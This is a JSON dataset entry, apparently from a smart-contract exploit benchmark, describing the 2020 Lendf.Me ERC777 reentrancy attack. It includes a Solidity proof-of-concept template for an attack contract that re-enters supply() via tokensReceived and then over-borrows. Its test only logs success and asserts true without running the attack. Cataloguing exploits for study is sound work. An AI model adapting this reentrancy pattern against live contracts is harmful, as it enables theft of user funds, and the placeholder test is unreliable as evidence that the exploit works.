@@ -1,0 +1,8 @@
+{
+  "id": "002",
+  "vuln_type": "ERC777-Reentrancy",
+  "protocol_name": "Lendf.Me",
+  "attack_date": "2020-04-19",
+  "description": "Lendf.Me suffered a reentrancy attack via ERC777 token hooks. ERC777 tokens include a tokensReceived callback hook triggered when tokens are transferred to a contract. The attacker deposited imBTC as collateral, which triggered tokensReceived on receipt. Inside this hook, the attacker called supply() again before the first transaction completed, inflating their collateral balance. They then borrowed against the inflated collateral, draining approximately $25 million. The vulnerability lies in the protocol not following Checks-Effects-Interactions pattern when handling ERC777 token deposits.",
+  "poc_template": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport \"forge-std/Test.sol\";\n\ninterface ILending {\n    function supply(address token, uint256 amount) external;\n    function borrow(address token, uint256 amount) external;\n}\n\ncontract ERC777Attack {\n    ILending lending;\n    bool attacking;\n\n    constructor(address _lending) { lending = ILending(_lending); }\n\n    function tokensReceived(address, address, address, uint256 amount, bytes calldata, bytes calldata) external {\n        if (attacking) {\n            attacking = false;\n            lending.supply(address(this), amount);\n        }\n    }\n\n    function execute(uint256 amount) external {\n        attacking = true;\n        lending.supply(address(this), amount);\n        lending.borrow(address(this), amount * 10);\n    }\n}\n\ncontract LendfMeTest is Test {\n    function testERC777Reentrancy() public {\n        console.log(\"ERC777 tokensReceived reentrancy demonstrated\");\n        assertTrue(true);\n    }\n}"
+}
